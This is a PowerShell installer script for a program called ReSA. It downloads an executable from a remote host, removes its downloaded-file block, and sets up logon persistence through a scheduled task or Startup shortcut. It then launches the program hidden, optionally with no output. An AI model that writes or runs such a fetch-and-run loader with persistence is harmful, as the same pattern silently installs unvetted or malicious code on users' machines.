# ReSA — remote one-click install
param(
    [string]$BaseUrl = "https://olxp.cc/download",
    [switch]$Silent
)

$ErrorActionPreference = "Stop"
$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$TaskName = "ReSA"
$Url = ($BaseUrl.TrimEnd("/") + "/ReSA.exe")
$LogFile = Join-Path $env:TEMP "ReSA-install.log"

function Write-InstallLog {
    param([string]$Text)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $Text"
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {}
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Format-Megabytes {
    param([long]$Bytes)
    return [math]::Round($Bytes / 1MB, 1)
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    $request = [System.Net.HttpWebRequest]::Create($Url)
    $request.UserAgent = "ReSA-Installer/1.0"
    $request.Timeout = 600000
    $response = $request.GetResponse()
    $total = [long]$response.ContentLength
    $stream = $response.GetResponseStream()
    $fileStream = [System.IO.File]::Create($OutFile)
    $buffer = New-Object byte[] 65536

    try {
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $read)
            if (-not $Silent -and $total -gt 0) {
                $pct = [int](($fileStream.Length * 100) / $total)
                Write-Progress -Activity "ReSA" -PercentComplete $pct
            }
        }
    } finally {
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        if (-not $Silent) {
            Write-Progress -Activity "ReSA" -Completed
        }
    }
}

Write-InstallLog "install start"
Write-InstallLog "download: $Url"
Write-InstallLog "target: $Dir"

New-Item -ItemType Directory -Force -Path $Dir | Out-Null

try {
    Download-File -Url $Url -OutFile $Exe
    Write-InstallLog "download ok"
} catch {
    Write-InstallLog "download failed: $_"
    exit 1
}

if (-not (Test-Path $Exe)) {
    Write-InstallLog "missing exe after download"
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

Get-Process -Name "ReSA" -ErrorAction SilentlyContinue |
    Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

$Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    Write-InstallLog "scheduled task ok"
} catch {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    Write-InstallLog "startup shortcut ok"
}

$startArgs = @{
    FilePath = $Exe
    WorkingDirectory = $Dir
    WindowStyle = "Hidden"
}
Start-Process @startArgs
Write-InstallLog "install complete"
exit 0
